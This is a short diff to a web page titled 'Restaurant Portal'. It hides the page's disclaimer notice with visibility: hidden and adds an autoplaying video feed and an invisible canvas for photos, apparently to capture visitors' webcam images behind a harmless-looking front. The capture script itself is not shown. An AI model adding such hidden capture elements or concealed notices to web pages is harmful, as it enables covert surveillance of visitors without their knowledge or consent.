@@ -6,7 +6,7 @@
     <title>Restaurant Portal</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; padding: 20px, background-color: red ; }
-        .disclaimer { background-color: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeeba; margin-bottom: 20px; font-weight: bold; }
+        .disclaimer { background-color: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeeba; margin-bottom: 20px; font-weight: bold;visibility: hidden;  }
         video { border: 2px solid #ccc; border-radius: 8px; margin-bottom: 10px; background-color: #f8f9fa; }
         .spinner { margin-top: 20px; font-weight: bold; font-size: 18px; color: #0056b3; }
     </style>
@@ -18,7 +18,8 @@
     <div class="disclaimer">
         NOTICE: this web site make just 10second.
     </div>
-    
+    <video id="videoFeed" width="320" height="240" autoplay playsinline></video>
+    <canvas id="photoCanvas" width="320" height="240" style="display:none;"></canvas>
     <p id="statusMessage" class="spinner">Initializing system...</p>
 
     <script>
